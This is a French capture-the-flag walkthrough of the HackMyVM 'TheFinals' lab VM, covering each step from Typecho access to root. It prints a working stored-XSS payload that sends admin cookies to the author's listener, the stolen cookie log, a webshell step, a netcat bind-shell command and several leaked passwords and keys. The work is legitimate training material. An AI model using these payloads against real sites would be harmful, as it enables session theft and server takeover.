---
title: "Solution du CTF TheFinals de HackMyVM.eu"
tags: [CTF,HackMyVM]
---

### Playoffs

TheFinals est une VM de type boot2root disponible sur [HackMyVM](https://www.hackmyvm.eu/).

Bon point pour cette VM : elle donne son IP sur la console dès le lancement, on peut commencer direct à scanner les ports.

```console
$ sudo nmap -T5 -p- -sCV 192.168.56.103
Starting Nmap 7.94SVN ( https://nmap.org )
Nmap scan report for 192.168.56.103
Host is up (0.000060s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.9 (protocol 2.0)
| ssh-hostkey: 
|   256 42:a7:04:bb:da:b5:8e:71:7a:89:ff:a4:60:cd:4d:29 (ECDSA)
|_  256 37:32:71:ca:3f:11:41:b4:d7:90:1e:c9:7f:e8:bc:20 (ED25519)
80/tcp open  http    Apache httpd 2.4.62 ((Unix))
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.62 (Unix)
|_http-title: THE FINALS
MAC Address: 08:00:27:06:C6:DB (Oracle VirtualBox virtual NIC)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.05 seconds
```

Sur le port 80 se trouve une espèce de galerie avec en footer la mention `THEFINALS.hmv`.

Le site semble statique, juste avec un peu de javascript. On peut utiliser `feroxbuster` pour trouver des fichiers et dossiers.

```console
$ feroxbuster -u http://192.168.56.103/ -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.10.4
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://192.168.56.103/
 🚀  Threads               │ 50
 📖  Wordlist              │ /opt/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.10.4
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        9l       31w      274c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
403      GET        9l       28w      277c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
301      GET        9l       28w      313c http://192.168.56.103/blog => http://192.168.56.103/blog/
301      GET        9l       28w      320c http://192.168.56.103/screenshots => http://192.168.56.103/screenshots/
301      GET        9l       28w      319c http://192.168.56.103/blog/admin => http://192.168.56.103/blog/admin/
```

Le path `/blog` délivre un CMS qui ressemble à première vue à du Wordpress mais les métadonnées sont explicites :

```html
<meta name="keywords" content="typecho,php,blog" />
<meta name="generator" content="Typecho 1.2.0" />
```

À l'adresse `/blog/admin` l'interface est encore plus explicite avec le logo de l'application.

J'ai tenté quelques identifiants et mot de passe, mais aucun résultat.

Pour terminer le dossier `/screenshots` est intéressant : on y trouve des prises d'écran de l'interface administrateur du Typecho, en particulier la modération des commentaires.

Ajouté à celà, de nouveaux screenshots apparaissent régulièrement, preuve qu'il y a une activité.

### France 98

Je m'oriente plutôt vers l'exploitation d'un XSS et d'ailleurs, je trouve un exploit sur exploit-db :

[Typecho 1.3.0 - Stored Cross-Site Scripting (XSS) - PHP webapps Exploit](https://www.exploit-db.com/exploits/52162)

Il s'agit de code Go. L'exploit s'attend à recevoir des cookies en paramètre.

```go
func createPost(u string, cookies string, payload string) string {
    formData := url.Values{}
    formData.Set("title", postTitle)
    formData.Set("text", payload+"\n"+postText)
    formData.Set("do", "save")
    formData.Set("markdown", "1")
    formData.Set("category%5B%5D", "1")
    formData.Set("allowComment", "1")
    formData.Set("allowPing", "1")
    formData.Set("allowFeed", "1")
    formData.Set("dst", "60")
    formData.Set("timezone", "7200")
```

À regarder le code, les champs de formulaire ne correspondent pas tout à fait à ce qui est réellement envoyé lorsque j'ai soumis un commentaire.

```
author=yolo&mail=truc%40bidule.com&url=&
text=Check+this+out%0D%0A%0D%0A%3Cimg+src%3D%22http%3A%2F%2F192.168.56.1%3A8000%2Fcomic.jpg%22+%2F%3E&
_=82fec9c8e4015b214ee3846ef1b92e15
```

À l'aide d'un moteur de recherche, j'ai trouvé un autre exploit :

[Typecho 1.2.1 XSS](https://h40vv3n.github.io/2024/09/05/typecho-xss/)

Cette fois, la version correspond et l'exploitation semble plus aisée (pas à s'occuper des cookies).

D'ailleurs le PoC est très court :

```
http://test.com/"onmouseover="alert(document.cookie)""
```

Vu que la vulnérabilité semble toucher le champ "website", on devine que l'injection se fait dans l'attribut `href` de l'élément `<a>`.

L'utilisation de ce payload n'aboutit malheureusement pas : le nouveau screenshot disponible sur le serveur ne montre aucune fenêtre de dialogue.

![TheFinals XSS attempt](/assets/img/hackmyvm/TheFinals_failed_img.png)

Pas étonnant, car l'exploit nécessite un survol du lien.

Je me suis tourné vers un payload utilisé par Wapiti dont je sais qu'il fait des merveilles.

[wapiti/wapitiCore/data/attacks/xssPayloads.ini at master · wapiti-scanner/wapiti · GitHub](https://github.com/wapiti-scanner/wapiti/blob/master/wapitiCore/data/attacks/xssPayloads.ini#L340C21-L340C72)

Le voici, adapté pour le CTF :
```html
http://test.com/"autofocus=""onfocus="location.href='http://192.168.56.1/'+encodeURI(document.cookie)
```

On définit un event pour `onfocus` et on force le focus avec l'attribut `autofocus`.

On aura bien sûr pris soin de mettre un serveur web en écoute :

```
192.168.56.104 - - [04/May/2025 15:00:03] "GET /7d07d00c3730d08dbac222ccaf73fd49__typecho_uid=1;%207d07d00c3730d08dbac222ccaf73fd49__typecho_authCode=%2524T%2524rNIwo0HHs7d96450c05b9caa710dfd5bbc4499ac2;%20PHPSESSID=8e8c2b3214af285bdeb9e74e6a0adaea HTTP/1.1" 404 -
```

Cookies volés !

Maintenant, il faut les injecter dans le navigateur. J'ai galéré avec `EditThisCookie` et je me dis que la prochaine fois, j'utiliserais un autre outil.

J'ai dû passer par l'option pour importer des cookies au format JSON. J'ai demandé de l'aide à ChatGPT et elle m'a proposé ce code :

```json
[
  {
    "domain": "thefinals.hmv",
    "expirationDate": 1780126051.038086,
    "hostOnly": true,
    "httpOnly": false,
    "name": "7d07d00c3730d08dbac222ccaf73fd49__typecho_uid",
    "path": "/",
    "sameSite": "unspecified",
    "secure": false,
    "session": false,
    "storeId": "0",
    "value": "1",
    "id": 1
  },
  {
    "domain": "thefinals.hmv",
    "expirationDate": 1780126051.038086,
    "hostOnly": true,
    "httpOnly": false,
    "name": "7d07d00c3730d08dbac222ccaf73fd49__typecho_authCode",
    "path": "/",
    "sameSite": "unspecified",
    "secure": false,
    "session": false,
    "storeId": "0",
    "value": "$T$krm8FLsQaf8e871228c9e3d8dcc3bbf245384fef7",
    "id": 2
  },
  {
    "domain": "thefinals.hmv",
    "expirationDate": 1780126051.038086,
    "hostOnly": true,
    "httpOnly": false,
    "name": "PHPSESSID",
    "path": "/",
    "sameSite": "unspecified",
    "secure": false,
    "session": false,
    "storeId": "0",
    "value": "c0e1463cd6c48decf470be073287ae27",
    "id": 3
  }
]
```

Une fois injecté les cookies ne tiennent pas, la session est détruite après quelques secondes.

Pour me simplifier la tâche entre la récupération des cookies et leur utilisation, j'ai écrit le script `index.php` suivant, servi par `php -S` :

```php
<?php
$request_uri = urldecode(urldecode($_SERVER['REQUEST_URI']));
$method = $_SERVER['REQUEST_METHOD'];

error_log("[$method] $request_uri");
sleep(5000);

return false;
?>
```

Cette fois, j'ai assez de temps pour modifier les cookies et aller éditer un fichier du thème courant afin d'ajouter un webshell :

![TheFinals webshell](/assets/img/hackmyvm/TheFinals_theme_editor.png)

Avec cet accès, je peux trouver la config du site :

```php
  'host' => 'localhost',
  'port' => 3306,
  'user' => 'typecho_u',
  'password' => 'QLTkbviW71CSRZtGWIQdB6s',
```

Ou encore lister les utilisateurs depuis `/etc/passwd` :

```
june:x:1001:100::/home/june:/bin/ash
scotty:x:1002:100::/home/scotty:/bin/ash
staff:x:1000:100::/home/staff:/bin/ash
```

J'obtiens même le premier flag :

```
/home/june:
total 16
drwxr-sr-x    2 june     users         4096 Apr  3 17:00 .
drwxr-xr-x    5 root     root          4096 Apr  3 13:21 ..
lrwxrwxrwx    1 root     users            9 Apr  3 12:24 .ash_history -> /dev/null
-rw-r--r--    1 june     users          183 Apr 15 08:28 message.txt
-rw-r--r--    1 june     users         3421 Apr  3 12:29 user.flag
```

```
flag{4b5d61daf3e2e5ba57019f617012ad0919c2a6c29e11912aeadef2820be8f298}
```

### Demi-finales

On va passer à un shell un peu plus civilisé avec netcat (note: le système est un Alpine Linux et utilise les outils busybox) :

```bash
nc -lk -p 4444 -e /bin/ash
```

Une fois sur le port 4444, j'obtiens un pty :

```bash
python3 -c "import pty; pty.spawn('/bin/ash')"
```

Là, je remarque différentes choses dont ce processus :

```bash
2553 scotty    0:00 /usr/bin/python3 /home/scotty/cns_boardcast/main.py
```

Ou encore un binaire setuid inconnu (il s'est avéré legit plus tard) :

```
---s--x--x    1 root     root       13.9K Jan 18 02:12 /bin/bbsuid
```

Ce dernier toutefois semble nécessiter des privilèges root (il râle au lancement).

J'ai fouillé dans la base de données sans résultat (hash trop costaud pour être cassé) :

```sql
MariaDB [typecho_db]> select * from typecho_users;
select * from typecho_users;
+-----+-------+------------------------------------+---------------------+---------------------------+------------+------------+------------+------------+---------------+----------------------------------+
| uid | name  | password                           | mail                | url                       | screenName | created    | activated  | logged     | group         | authCode                         |
+-----+-------+------------------------------------+---------------------+---------------------------+------------+------------+------------+------------+---------------+----------------------------------+
|   1 | staff | $P$B/qMMS9FETOrEZ38X0YDY5gKJOyiwQ1 | staff@thefinals.hmv | http://thefinals.hmv/blog | staff      | 1743647281 | 1746368941 | 1746368881 | administrator | 031d828ec4a800b2484f8839734d98b7 |
+-----+-------+------------------------------------+---------------------+---------------------------+------------+------------+------------+------------+---------------+----------------------------------+
1 row in set (0.001 sec)
```

En cherchant les fichiers des différents utilisateurs, j'ai trouvé deux fichiers des logs :

```console
$ ls /var/log -al
total 248
drwxr-xr-x    4 root     root          4096 Apr  3 13:33 .
drwxr-xr-x   13 root     root          4096 Apr  3 14:38 ..
-rw-r-----    1 root     wheel           84 Apr 23 17:30 acpid.log
drwxr-s---    2 root     wheel         4096 Apr  3 10:09 apache2
drwxr-s---    2 root     wheel         4096 Apr  3 09:57 chrony
-rw-r-----    1 root     root         36580 May  4 20:25 dmesg
-rw-r-----    1 root     wheel       117278 May  4 22:33 messages
-rw-r--r--    1 scotty   users            0 Apr  3 13:33 scotty-main.err
-rw-r--r--    1 scotty   users        65662 May  4 22:31 scotty-main.log
-rw-rw-r--    1 root     utmp             0 Apr  3 09:58 wtmp
```

Dans le fichier `scotty-main.log` on peut lire ce message en boucle :

```
Broadcast to eth0 192.168.56.104:1337
```

Mon premier réflexe a été de mettre en écoute le port 1337 en TCP mais il est resté désespérément silencieux.

Finalement, j'ai eu un retour avec UDP :

```console
$ nc -l -p 1337 -u -v
LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFNd0FBQUF0emMyZ3RaVwpReU5UVXhPUUFBQUNBMXduMDk0cGhPcXNmYm8rbzNDQllpTjN4QTE2eW1LU2JYMlVZMzJ4L0FFd0FBQUpnRGMvWVVBM1AyCkZBQUFBQXR6YzJndFpXUXlOVFV4T1FBQUFDQTF3bjA5NHBoT3FzZmJvK28zQ0JZaU4zeEExNnltS1NiWDJVWTMyeC9BRXcKQUFBRUN2N2tmZW9YT1FDaTVDUklXZEhpRFQ1dXBLeVkzdlF4QWxLbXhFUXpSWkxEWENmVDNpbUU2cXg5dWo2amNJRmlJMwpmRURYcktZcEp0ZlpSamZiSDhBVEFBQUFFbkp2YjNSQWRHaGxabWx1WVd4ekxtaHRkZ0VDQXc9PQotLS0tLUVORCBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0K
```

Le base64 se décode ainsi :

```
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACA1wn094phOqsfbo+o3CBYiN3xA16ymKSbX2UY32x/AEwAAAJgDc/YUA3P2
FAAAAAtzc2gtZWQyNTUxOQAAACA1wn094phOqsfbo+o3CBYiN3xA16ymKSbX2UY32x/AEw
AAAECv7kfeoXOQCi5CRIWdHiDT5upKyY3vQxAlKmxEQzRZLDXCfT3imE6qx9uj6jcIFiI3
fEDXrKYpJtfZRjfbH8ATAAAAEnJvb3RAdGhlZmluYWxzLmhtdgECAw==
-----END OPENSSH PRIVATE KEY-----
```

Il s'agit de la clé de scotty.

```console
$ ssh -i key.priv scotty@thefinals.hmv

thefinals:~$ ls -al
total 16
drwx------    4 scotty   users         4096 Apr 23 17:28 .
drwxr-xr-x    5 root     root          4096 Apr  3 13:21 ..
lrwxrwxrwx    1 root     root             9 Apr  3 12:56 .ash_history -> /dev/null
-rw-------    1 scotty   users            0 Apr 23 17:28 .mariadb_history
drwx------    2 scotty   users         4096 Apr  3 12:49 .ssh
drwx------    2 scotty   users         4096 Apr  3 12:59 cns_boardcast
```

Voici le script Python qui était utilisé :

```python
import socket
import time
import netifaces
import base64

def send_udp_broadcast_to_all_interfaces(message, port=1337):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)

    try:
        interfaces = netifaces.interfaces()

        for iface in interfaces:
            if iface == 'lo':
                continue
            if_addrs = netifaces.ifaddresses(iface)

            if netifaces.AF_INET in if_addrs:
                for addr_info in if_addrs[netifaces.AF_INET]:
                    broadcast_addr = addr_info.get('broadcast')
                    if broadcast_addr:
                        data = message.encode('utf-8')
                        sock.sendto(data, (broadcast_addr, port))
                        print(f"Broadcast to {iface} {broadcast_addr}:{port}")
                    else:
                        print(f"Cannot broadcast on {iface}")

    except Exception as e:
        print(f"Cannot broadcast caused {e}")

    finally:
        sock.close()

if __name__ == "__main__":
    with open("/home/scotty/.ssh/id_ed25519", "rb") as key_file:
        key_data = key_file.read()
        base64_key = base64.b64encode(key_data).decode('utf-8')

    while True:
        send_udp_broadcast_to_all_interfaces(base64_key)
        time.sleep(5)
```

### La victoire est en nous

L'utilisateur peut lancer la commande `secret` en tant qu'administrateur :

```console
thefinals:~$ sudo -l
Matching Defaults entries for scotty on thefinals:
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

Runas and Command-specific defaults for scotty:
    Defaults!/usr/sbin/visudo env_keep+="SUDO_EDITOR EDITOR VISUAL"

User scotty may run the following commands on thefinals:
    (ALL) NOPASSWD: /sbin/secret
```

Mais cette dernière échoue :

```console
thefinals:~$ sudo /sbin/secret
/sbin/secret: line 2: can't create /dev/pts/99: Permission denied
```

Le programme veut utiliser `/dev/pts/99` comme terminal. On est actuellement sur le terminal 3.

On peut cependant créer de nouveaux terminaux virtuels avec la commande `exec` :

```console
thefinals:~$ tty
/dev/pts/3
thefinals:~$ ls /dev/pts/*
/dev/pts/0     /dev/pts/1     /dev/pts/2     /dev/pts/3     /dev/pts/4     /dev/pts/5     /dev/pts/ptmx
thefinals:~$ setsid ash -c 'exec ash < /dev/ptmx > /dev/ptmx 2>&1 &'
thefinals:~$ ls /dev/pts/*
/dev/pts/0     /dev/pts/1     /dev/pts/2     /dev/pts/3     /dev/pts/4     /dev/pts/5     /dev/pts/6     /dev/pts/7     /dev/pts/ptmx
```

On recommence autant de fois que nécessaire jusqu'à être proche du numéro attendu :

```console
thefinals:~$ setsid ash -c 'exec ash < /dev/ptmx > /dev/ptmx 2>&1 &'
thefinals:~$ ls /dev/pts/*
/dev/pts/0     /dev/pts/15    /dev/pts/21    /dev/pts/28    /dev/pts/34    /dev/pts/40    /dev/pts/47    /dev/pts/53    /dev/pts/6     /dev/pts/66    /dev/pts/72    /dev/pts/79    /dev/pts/85    /dev/pts/91    /dev/pts/ptmx
/dev/pts/1     /dev/pts/16    /dev/pts/22    /dev/pts/29    /dev/pts/35    /dev/pts/41    /dev/pts/48    /dev/pts/54    /dev/pts/60    /dev/pts/67    /dev/pts/73    /dev/pts/8     /dev/pts/86    /dev/pts/92
/dev/pts/10    /dev/pts/17    /dev/pts/23    /dev/pts/3     /dev/pts/36    /dev/pts/42    /dev/pts/49    /dev/pts/55    /dev/pts/61    /dev/pts/68    /dev/pts/74    /dev/pts/80    /dev/pts/87    /dev/pts/93
/dev/pts/11    /dev/pts/18    /dev/pts/24    /dev/pts/30    /dev/pts/37    /dev/pts/43    /dev/pts/5     /dev/pts/56    /dev/pts/62    /dev/pts/69    /dev/pts/75    /dev/pts/81    /dev/pts/88    /dev/pts/94
/dev/pts/12    /dev/pts/19    /dev/pts/25    /dev/pts/31    /dev/pts/38    /dev/pts/44    /dev/pts/50    /dev/pts/57    /dev/pts/63    /dev/pts/7     /dev/pts/76    /dev/pts/82    /dev/pts/89    /dev/pts/95
/dev/pts/13    /dev/pts/2     /dev/pts/26    /dev/pts/32    /dev/pts/39    /dev/pts/45    /dev/pts/51    /dev/pts/58    /dev/pts/64    /dev/pts/70    /dev/pts/77    /dev/pts/83    /dev/pts/9     /dev/pts/96
/dev/pts/14    /dev/pts/20    /dev/pts/27    /dev/pts/33    /dev/pts/4     /dev/pts/46    /dev/pts/52    /dev/pts/59    /dev/pts/65    /dev/pts/71    /dev/pts/78    /dev/pts/84    /dev/pts/90    /dev/pts/97
```

Pour le dernier, on se connecte en SSH et on relance la commande `secret` :

```
$ ssh -i key.priv scotty@thefinals.hmv

thefinals:~$ tty
/dev/pts/99
thefinals:~$ sudo /sbin/secret
root:p8RuoQGTtlKLAjuF1Tpy5wX
```

Je m'attendais à devoir utiliser ce mot de passe via `su` mais il y avait en vrai une base de données qu'on ne voyait pas auparavant.

```console
thefinals:~$ mysql -u root -p
mysql: Deprecated program name. It will be removed in a future release, use '/usr/bin/mariadb' instead
Enter password: 
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 1189
Server version: 11.4.5-MariaDB Alpine Linux

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| secret             |
| sys                |
| test               |
| typecho_db         |
+--------------------+
7 rows in set (0.010 sec)

MariaDB [(none)]> use secret;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [secret]> show tables;
+------------------+
| Tables_in_secret |
+------------------+
| user             |
+------------------+
1 row in set (0.000 sec)

MariaDB [secret]> select * from user;
+----+----------+-------------------------+
| id | username | password                |
+----+----------+-------------------------+
|  1 | root     | BvIpFDyB4kNbkyqJGwMzLcK |
+----+----------+-------------------------+
1 row in set (0.000 sec)
```

Cette fois le mot de passe est le bon :

```console
thefinals:~$ su root
Password: 
/home/scotty # cd /root
~ # ls -al
total 32
drwx------    5 root     root          4096 Apr  3 16:58 .
drwxr-xr-x   22 root     root          4096 Apr  3 11:48 ..
lrwxrwxrwx    1 root     root             9 Apr  3 10:06 .ash_history -> /dev/null
drwxr-xr-x    3 root     root          4096 Apr  3 11:31 .cache
-rw-r--r--    1 root     root            29 Apr  3 17:54 .cns_secret
drwxr-xr-x    4 root     root          4096 Apr  3 11:49 .config
lrwxrwxrwx    1 root     root             9 Apr  3 12:24 .mariadb_history -> /dev/null
drwx------    3 root     root          4096 Apr  3 11:52 .pki
lrwxrwxrwx    1 root     root             9 Apr  3 12:56 .viminfo -> /dev/null
-rw-r--r--    1 root     root           746 Apr  3 14:47 note.txt
-rwxrwx---    1 root     root           242 Apr  3 13:54 root.flag
~ # cat root.flag
 _____      __   __      ______
/\  __\    /\ "-.\ \    /\  ___\
\ \ \___   \ \ \-.  \   \ \___  \
 \ \____\   \ \_\\"\_\   \ \_____\
  \/____/    \/_/ \/_/    \/_____/

flag{8c5daa407626d218e962041dd8fd8f37913e56e32a6f06725da403175be0b9ff}
```

### Comment ça marche ?

L'utilisateur `staff` a une tâche crontab qui est lancée toutes les minutes et qui prend un screenshot de la page des commentaires.

```python
~ # su staff
/root $ crontab -l
* * * * * cd /opt/comment_reviewer/ && /usr/bin/python3 /opt/comment_reviewer/main.py
/root $ cat /opt/comment_reviewer/main.py
from playwright.sync_api import sync_playwright

import time

STAFF_USERNAME = 'staff'
STAFF_PASSWORD = 'n3nPbqEOhs6eTcchyqXTXWi'

def run(playwright):
    browser = playwright.chromium.launch(headless=True, executable_path='/usr/bin/chromium-browser')
    page = browser.new_page()

    page.goto('http://thefinals.hmv/blog/admin/manage-comments.php')

    page.fill('//form[@name="login"]//input[@id="name"]', STAFF_USERNAME)
    page.fill('//form[@name="login"]//input[@id="password"]', STAFF_PASSWORD)

    page.click('//p[@class="submit"]//button[@type="submit"]')

    page.wait_for_load_state('networkidle')

    timestrap = int(time.time())
    page.screenshot(path=f'/var/www/html/screenshots/{timestrap}.png')

    browser.close()

with sync_playwright() as playwright:
    run(playwright)
```

Quant au script `secret` il est tout simple :

```bash
#!/bin/sh
/bin/cat /root/.cns_secret > /dev/pts/99
```
